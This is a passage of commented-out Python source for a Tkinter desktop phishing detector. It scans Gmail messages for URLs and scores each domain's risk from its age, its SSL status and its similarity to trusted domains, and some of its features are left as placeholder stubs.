#         results_header = ttk.Frame(main_frame, style='Card.TFrame')
#         results_header.grid(row=3, column=0, columnspan=2, pady=(0, 5), sticky=(tk.W, tk.E))
#
#         self.results_counter = ttk.Label(results_header,
#                                          text="📊 Results: 0 emails scanned | 0 suspicious URLs found",
#                                          style='Subtitle.TLabel')
#         self.results_counter.grid(row=0, column=0, sticky=tk.W)
#
#         # Results area with modern card
#         results_card = ttk.LabelFrame(main_frame, text="📋 SCAN RESULTS", padding="12")
#         results_card.grid(row=4, column=0, columnspan=2, pady=(0, 10), sticky=(tk.W, tk.E, tk.N, tk.S))
#         results_card.configure(style='Card.TFrame')
#
#         # Configure text widget with tags for highlighting
#         self.results_text = scrolledtext.ScrolledText(
#             results_card,
#             height=18,
#             width=120,
#             font=('Consolas', 10),
#             wrap=tk.WORD,
#             bg=self.colors['card_bg'],
#             fg=self.colors['text_primary'],
#             insertbackground=self.colors['text_primary'],
#             selectbackground=self.colors['accent'],
#             relief='flat',
#             borderwidth=1
#         )
#
#         # Configure highlight tags
#         self.results_text.tag_configure("safe", background=self.colors['highlight_safe'])
#         self.results_text.tag_configure("low", background=self.colors['highlight_low'])
#         self.results_text.tag_configure("medium", background=self.colors['highlight_medium'])
#         self.results_text.tag_configure("high", background=self.colors['highlight_high'])
#         self.results_text.tag_configure("suspicious", foreground=self.colors['danger'], font=('Consolas', 10, 'bold'))
#
#         self.results_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
#
#         # Footer
#         footer_frame = ttk.Frame(main_frame, style='Card.TFrame')
#         footer_frame.grid(row=5, column=0, columnspan=2, pady=(10, 0), sticky=(tk.W, tk.E))
#
#         footer_label = ttk.Label(footer_frame,
#                                  text="🔍 Scanning emails • ⚠️ Real-time Risk Assessment",
#                                  style='Subtitle.TLabel')
#         footer_label.grid(row=0, column=0, sticky=tk.W)
#
#         # Configure grid weights
#         main_frame.columnconfigure(0, weight=1)
#         main_frame.rowconfigure(4, weight=1)
#         results_card.columnconfigure(0, weight=1)
#         results_card.rowconfigure(0, weight=1)
#         progress_card.columnconfigure(0, weight=1)
#         button_frame.columnconfigure(4, weight=1)
#         status_frame.columnconfigure(0, weight=1)
#         footer_frame.columnconfigure(0, weight=1)
#
#     def update_results_counter(self, emails_scanned, suspicious_urls):
#         """Update the results counter"""
#         self.results_counter.config(
#             text=f"📊 Results: {emails_scanned} emails scanned | {suspicious_urls} suspicious URLs found"
#         )
#
#     def highlight_text_based_on_risk(self, risk_score, start_index):
#         """Highlight text based on risk score"""
#         if not self.settings.get('highlight_suspicious', True):
#             return
#
#         if risk_score >= 70:
#             tag = "high"
#         elif risk_score >= 40:
#             tag = "medium"
#         elif risk_score >= 20:
#             tag = "low"
#         else:
#             tag = "safe"
#
#         # Get the current line
#         current_line = self.results_text.index(start_index).split('.')[0]
#         end_index = f"{current_line}.end"
#
#         # Apply highlighting
#         self.results_text.tag_add(tag, start_index, end_index)
#
#     def update_status(self, message, progress=None):
#         """Update status label and progress"""
#         self.status_label.config(text=message)
#         if progress is not None:
#             self.progress['value'] = progress
#             self.progress_label.config(text=f"{progress}%")
#
#     def start_scan(self):
#         """Start scanning emails"""
#         if self.scanning:
#             return
#
#         self.scanning = True
#         self.stop_scan = False
#         self.scan_btn.config(state='disabled')
#         self.stop_btn.config(state='normal')
#         self.progress['value'] = 0
#         self.results_text.delete('1.0', tk.END)
#         self.update_status("Initializing scan...", 0)
#         self.update_results_counter(0, 0)
#
#         # Add welcome message
#         welcome_msg = "🚀 Starting Advanced Phishing Detection...\n"
#         welcome_msg += "=" * 70 + "\n"
#         welcome_msg += "AI-Powered Security Scanner | Real-time Phishing Detection\n"
#         welcome_msg += f"Scanning {self.settings['scan_limit']} emails | Risk Threshold: {self.settings['risk_threshold']}%\n"
#         welcome_msg += "=" * 70 + "\n\n"
#         self.results_text.insert(tk.END, welcome_msg)
#
#         # Run scan in thread
#         thread = threading.Thread(target=self.do_scan)
#         thread.daemon = True
#         thread.start()
#
#     def stop_scan_func(self):
#         """Stop the ongoing scan"""
#         if self.scanning:
#             self.stop_scan = True
#             self.update_status("Stopping scan...")
#             self.results_text.insert(tk.END, "\n\n⏹️ Scan stopped by user.\n")
#
#     def do_scan(self):
#         """Perform the actual scan"""
#         try:
#             if self.stop_scan:
#                 self.root.after(0, self.scan_complete)
#                 return
#
#             self.root.after(0, lambda: self.update_status("Authenticating with Gmail...", 10))
#             service = self.authenticate_gmail()
#             if not service:
#                 self.root.after(0, self.scan_complete)
#                 return
#
#             if self.stop_scan:
#                 self.root.after(0, self.scan_complete)
#                 return
#
#             self.root.after(0, lambda: self.update_status("Fetching emails...", 20))
#             results = service.users().messages().list(userId='me', maxResults=self.settings['scan_limit']).execute()
#             messages = results.get('messages', [])
#
#             if not messages:
#                 self.root.after(0, lambda: self.results_text.insert(tk.END, "📭 No emails found to scan.\n"))
#                 self.root.after(0, self.scan_complete)
#                 return
#
#             total_suspicious = 0
#             total_urls = 0
#             scanned_emails = 0
#
#             for i, msg in enumerate(messages):
#                 if self.stop_scan:
#                     break
#
#                 try:
#                     progress = 20 + (i / len(messages)) * 60
#                     self.root.after(0,
#                                     lambda: self.update_status(f"Scanning email {i + 1}/{len(messages)}...", progress))
#
#                     msg_data = service.users().messages().get(userId='me', id=msg['id']).execute()
#                     urls, subject = self.extract_urls(msg_data)
#
#                     if not urls:
#                         continue
#
#                     scanned_emails += 1
#                     total_urls += len(urls)
#
#                     # Email header
#                     email_report = f"\n{'=' * 70}\n"
#                     email_report += f"📧 Email {i + 1} | Subject: {subject}\n"
#                     email_report += f"🔗 {len(urls)} URLs found\n"
#                     email_report += f"{'=' * 70}\n"
#
#                     self.root.after(0, lambda r=email_report: self.results_text.insert(tk.END, r))
#
#                     for j, url in enumerate(urls):
#                         if self.stop_scan:
#                             break
#
#                         ext = tldextract.extract(url)
#                         domain = f"{ext.domain}.{ext.suffix}"
#
#                         # Skip common technical domains
#                         if any(skip in domain for skip in ['googleapis', 'cloudfront', 'akamai', 'gstatic']):
#                             continue
#
#                         self.root.after(0, lambda: self.update_status(f"Analyzing: {domain}"))
#
#                         domain_info = self.get_domain_info(domain)
#                         is_similar, similar_to, similarity_score = self.check_domain_similarity(domain)
#                         risk_score, risk_factors = self.calculate_risk(
#                             domain_info, is_similar, similarity_score, url, subject
#                         )
#
#                         # Build detailed report
#                         current_position = self.results_text.index(tk.END)
#                         url_report = self.format_url_report(
#                             j + 1, url, domain, domain_info, risk_score, risk_factors, similar_to
#                         )
#
#                         if risk_score >= self.settings['risk_threshold']:
#                             total_suspicious += 1
#
#                         self.root.after(0, lambda r=url_report: self.results_text.insert(tk.END, r))
#                         self.root.after(0, lambda: self.highlight_text_based_on_risk(risk_score, current_position))
#                         self.root.after(0, lambda: self.update_results_counter(scanned_emails, total_suspicious))
#                         self.root.after(0, self.results_text.see, tk.END)
#
#                 except Exception as e:
#                     error_msg = f"\n❌ Error processing email: {str(e)}\n"
#                     self.root.after(0, lambda r=error_msg: self.results_text.insert(tk.END, r))
#
#             # Final summary
#             if not self.stop_scan:
#                 summary = self.generate_summary(total_suspicious, total_urls, scanned_emails, len(messages))
#                 self.root.after(0, lambda r=summary: self.results_text.insert(tk.END, r))
#                 self.root.after(0, lambda: self.update_status("Scan completed!", 100))
#
#         except Exception as e:
#             error_msg = f"❌ Scan failed: {str(e)}\n"
#             self.root.after(0, lambda r=error_msg: self.results_text.insert(tk.END, r))
#             self.root.after(0, lambda: self.update_status("Scan failed", 100))
#
#         self.root.after(0, self.scan_complete)
#
#     def format_url_report(self, index, url, domain, domain_info, risk_score, risk_factors, similar_to=None):
#         """Format URL analysis report with improved similarity information"""
#         # Truncate long URLs for display
#         display_url = url[:80] + "..." if len(url) > 80 else url
#
#         report = f"\n🔗 URL {index}: {display_url}\n"
#         report += f"🌐 Domain: {domain}\n"
#
#         # Risk level with color coding
#         if risk_score == 0:
#             report += f"✅ Risk: {risk_score}/100 - SAFE\n"
#         elif risk_score < 30:
#             report += f"🟢 Risk: {risk_score}/100 - LOW\n"
#         elif risk_score < 60:
#             report += f"🟡 Risk: {risk_score}/100 - MEDIUM\n"
#         else:
#             report += f"🔴 Risk: {risk_score}/100 - HIGH\n"
#
#         # Domain information
#         if domain_info['age_days'] != "Unknown":
#             report += f"📅 Domain Age: {domain_info['age_days']} days\n"
#
#         if domain_info['org'] != "Unknown":
#             report += f"🏢 Organization: {domain_info['org']}\n"
#
#         if domain_info['ssl_valid']:
#             report += f"🔐 SSL: Valid ({domain_info['ssl_days_left']} days left)\n"
#         else:
#             report += f"🔐 SSL: Invalid or missing\n"
#
#         # Improved similarity information
#         if similar_to:
#             report += f"🎭 Similar to: {similar_to} (potential impersonation)\n"
#
#         # Risk factors
#         if risk_factors:
#             report += "📋 Risk Factors:\n"
#             for factor in risk_factors:
#                 report += f"   • {factor}\n"
#
#         report += "-" * 60 + "\n"
#         return report
#
#     def generate_summary(self, suspicious_count, total_urls, scanned_emails, total_emails):
#         """Generate scan summary"""
#         summary = f"\n{'=' * 70}\n"
#         summary += "📊 SCAN SUMMARY\n"
#         summary += f"{'=' * 70}\n"
#         summary += f"📧 Emails processed: {scanned_emails}/{total_emails}\n"
#         summary += f"🔗 URLs analyzed: {total_urls}\n"
#         summary += f"🚨 Suspicious URLs: {suspicious_count}\n"
#
#         if total_urls > 0:
#             suspicious_percent = (suspicious_count / total_urls) * 100
#             summary += f"📈 Suspicious rate: {suspicious_percent:.1f}%\n"
#
#         # Security assessment
#         if suspicious_count == 0:
#             summary += f"\n✅ SECURITY STATUS: EXCELLENT\n"
#             summary += f"   No significant threats detected!\n"
#         elif suspicious_count < 3:
#             summary += f"\n⚠️  SECURITY STATUS: GOOD\n"
#             summary += f"   Low number of suspicious URLs found\n"
#         else:
#             summary += f"\n🚨 SECURITY STATUS: ATTENTION NEEDED\n"
#             summary += f"   Multiple suspicious URLs detected\n"
#
#         # Recommendations
#         if suspicious_count > 0:
#             summary += f"\n💡 RECOMMENDATIONS:\n"
#             summary += f"• Review {suspicious_count} suspicious URLs carefully\n"
#             summary += f"• Don't click on high-risk links\n"
#             summary += f"• Verify sender authenticity\n"
#             summary += f"• Use two-factor authentication\n"
#
#         summary += f"\n🛡️ Stay vigilant against phishing attacks!\n"
#         return summary
#
#     def scan_complete(self):
#         """Called when scan completes"""
#         self.scanning = False
#         self.stop_scan = False
#         self.progress.stop()
#         self.scan_btn.config(state='normal')
#         self.stop_btn.config(state='disabled')
#         self.results_text.see(tk.END)
#
#     def clear_results(self):
#         """Clear results text"""
#         self.results_text.delete('1.0', tk.END)
#         self.update_status("Ready to scan...", 0)
#         self.progress['value'] = 0
#         self.update_results_counter(0, 0)
#
#     def show_stats(self):
#         """Show statistics dialog"""
#         stats_window = tk.Toplevel(self.root)
#         stats_window.title("📊 Phishing Detection Statistics")
#         stats_window.geometry("500x400")
#         stats_window.configure(bg=self.colors['bg'])
#         stats_window.resizable(False, False)
#
#         # Center the window
#         stats_window.transient(self.root)
#         stats_window.grab_set()
#
#         stats_text = f"""
# 🛡️ SECURITY FEATURES:
#
# • Domain Age Analysis
# • SSL Certificate Validation
# • Domain Similarity Detection
# • URL Structure Analysis
# • Email Subject Analysis
# • Typosquatting Detection
# • Real-time Risk Scoring
#
# 📊 PROTECTION COVERAGE:
#
# • Banking & Financial Services
# • Government Portals
# • Email & Social Media
# • E-commerce Platforms
# • Payment Applications
# • Cloud Services
#
# 🔢 SYSTEM STATISTICS:
#
# Trusted Domains: {len(self.trusted_domains)}
# Suspicious Keywords: {len(self.suspicious_keywords)}
# Detection Methods: 7+
# Risk Factors: 15+
#
# 💡 TIP: Always verify suspicious emails
# before clicking any links or downloading attachments.
# """
#
#         stats_label = scrolledtext.ScrolledText(
#             stats_window,
#             font=('Consolas', 10),
#             bg=self.colors['card_bg'],
#             fg=self.colors['text_primary'],
#             wrap=tk.WORD
#         )
#         stats_label.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
#         stats_label.insert(tk.END, stats_text)
#         stats_label.config(state=tk.DISABLED)
#
#         ttk.Button(stats_window,
#                    text="Close",
#                    command=stats_window.destroy,
#                    style='Accent.TButton').pack(pady=10)
#
#     def show_settings(self):
#         """Show comprehensive settings dialog"""
#         settings_window = tk.Toplevel(self.root)
#         settings_window.title("⚙️ Settings - Advanced Phishing Detector")
#         settings_window.geometry("500x500")
#         settings_window.configure(bg=self.colors['bg'])
#         settings_window.resizable(False, False)
#
#         # Center the window
#         settings_window.transient(self.root)
#         settings_window.grab_set()
#
#         # Main frame
#         main_frame = ttk.Frame(settings_window, padding="20", style='Card.TFrame')
#         main_frame.pack(fill=tk.BOTH, expand=True)
#
#         # Title
#         title_label = ttk.Label(main_frame,
#                                 text="⚙️ Detection Settings",
#                                 style='Title.TLabel')
#         title_label.grid(row=0, column=0, columnspan=2, sticky=tk.W, pady=(0, 20))
#
#         # Scan Settings
#         scan_frame = ttk.LabelFrame(main_frame, text="🔍 Scan Settings", padding="15")
#         scan_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 15))
#
#         # Scan limit
#         ttk.Label(scan_frame, text="Emails to scan:", style='TLabel').grid(row=0, column=0, sticky=tk.W)
#         self.scan_limit_var = tk.StringVar(value=str(self.settings['scan_limit']))
#         scan_limit_entry = ttk.Entry(scan_frame, textvariable=self.scan_limit_var, width=10)
#         scan_limit_entry.grid(row=0, column=1, sticky=tk.W, padx=(10, 0))
#
#         # Risk threshold
#         ttk.Label(scan_frame, text="Risk threshold (%):", style='TLabel').grid(row=1, column=0, sticky=tk.W,
#                                                                                pady=(10, 0))
#         self.risk_threshold_var = tk.StringVar(value=str(self.settings['risk_threshold']))
#         risk_threshold_entry = ttk.Entry(scan_frame, textvariable=self.risk_threshold_var, width=10)
#         risk_threshold_entry.grid(row=1, column=1, sticky=tk.W, padx=(10, 0), pady=(10, 0))
#
#         # Similarity threshold
#         ttk.Label(scan_frame, text="Similarity threshold (%):", style='TLabel').grid(row=2, column=0, sticky=tk.W,
#                                                                                      pady=(10, 0))
#         self.similarity_threshold_var = tk.StringVar(value=str(self.settings['similarity_threshold']))
#         similarity_entry = ttk.Entry(scan_frame, textvariable=self.similarity_threshold_var, width=10)
#         similarity_entry.grid(row=2, column=1, sticky=tk.W, padx=(10, 0), pady=(10, 0))
#
#         # Features Settings
#         features_frame = ttk.LabelFrame(main_frame, text="🔧 Security Features", padding="15")
#         features_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 15))
#
#         # SSL Check
#         self.ssl_var = tk.BooleanVar(value=self.settings['enable_ssl_check'])
#         ssl_check = ttk.Checkbutton(features_frame,
#                                     text="Enable SSL Certificate Validation",
#                                     variable=self.ssl_var)
#         ssl_check.grid(row=0, column=0, sticky=tk.W)
#
#         # Similarity Check
#         self.similarity_var = tk.BooleanVar(value=self.settings['enable_similarity_check'])
#         similarity_check = ttk.Checkbutton(features_frame,
#                                            text="Enable Domain Similarity Detection",
#                                            variable=self.similarity_var)
#         similarity_check.grid(row=1, column=0, sticky=tk.W, pady=(5, 0))
#
#         # Subject Analysis
#         self.subject_var = tk.BooleanVar(value=self.settings['enable_subject_analysis'])
#         subject_check = ttk.Checkbutton(features_frame,
#                                         text="Enable Email Subject Analysis",
#                                         variable=self.subject_var)
#         subject_check.grid(row=2, column=0, sticky=tk.W, pady=(5, 0))
#
#         # Highlighting
#         self.highlight_var = tk.BooleanVar(value=self.settings['highlight_suspicious'])
#         highlight_check = ttk.Checkbutton(features_frame,
#                                           text="Highlight Suspicious Content",
#                                           variable=self.highlight_var)
#         highlight_check.grid(row=3, column=0, sticky=tk.W, pady=(5, 0))
#
#         # Buttons frame
#         buttons_frame = ttk.Frame(main_frame, style='Card.TFrame')
#         buttons_frame.grid(row=3, column=0, columnspan=2, pady=(20, 0))
#
#         def save_settings():
#             try:
#                 self.settings.update({
#                     'scan_limit': int(self.scan_limit_var.get()),
#                     'risk_threshold': int(self.risk_threshold_var.get()),
#                     'similarity_threshold': int(self.similarity_threshold_var.get()),
#                     'enable_ssl_check': self.ssl_var.get(),
#                     'enable_similarity_check': self.similarity_var.get(),
#                     'enable_subject_analysis': self.subject_var.get(),
#                     'highlight_suspicious': self.highlight_var.get()
#                 })
#                 messagebox.showinfo("Settings", "Settings saved successfully!", parent=settings_window)
#                 settings_window.destroy()
#             except ValueError:
#                 messagebox.showerror("Error", "Please enter valid numbers for scan settings.", parent=settings_window)
#
#         ttk.Button(buttons_frame,
#                    text="💾 Save Settings",
#                    command=save_settings,
#                    style='Success.TButton').grid(row=0, column=0, padx=(0, 10))
#
#         ttk.Button(buttons_frame,
#                    text="🔙 Reset to Defaults",
#                    command=self.reset_settings,
#                    style='Secondary.TButton').grid(row=0, column=1, padx=(0, 10))
#
#         ttk.Button(buttons_frame,
#                    text="❌ Cancel",
#                    command=settings_window.destroy,
#                    style='Danger.TButton').grid(row=0, column=2)
#
#         # Configure grid weights
#         main_frame.columnconfigure(1, weight=1)
#         scan_frame.columnconfigure(1, weight=1)
#         features_frame.columnconfigure(0, weight=1)
#
#     def reset_settings(self):
#         """Reset settings to defaults"""
#         self.settings = {
#             'scan_limit': 10,
#             'risk_threshold': 40,
#             'similarity_threshold': 75,
#             'enable_ssl_check': True,
#             'enable_similarity_check': True,
#             'enable_subject_analysis': True,
#             'highlight_suspicious': True
#         }
#         messagebox.showinfo("Settings", "Settings reset to defaults!")
#
#     def check_single_url(self):
#         """Check a single URL"""
#         url = simpledialog.askstring("Single URL Check", "Enter URL to analyze:")
#         if url:
#             # Simple implementation for single URL check
#             messagebox.showinfo("URL Check", f"Analysis for {url} would be performed here.")
#
#     def scan_latest_email(self):
#         """Scan only the latest email"""
#         messagebox.showinfo("Latest Email", "This would scan only the most recent email.")
#
#
# # Run the application
# if __name__ == '__main__':
#     root = tk.Tk()
#     app = AdvancedPhishingDetector(root)
#     root.mainloop()


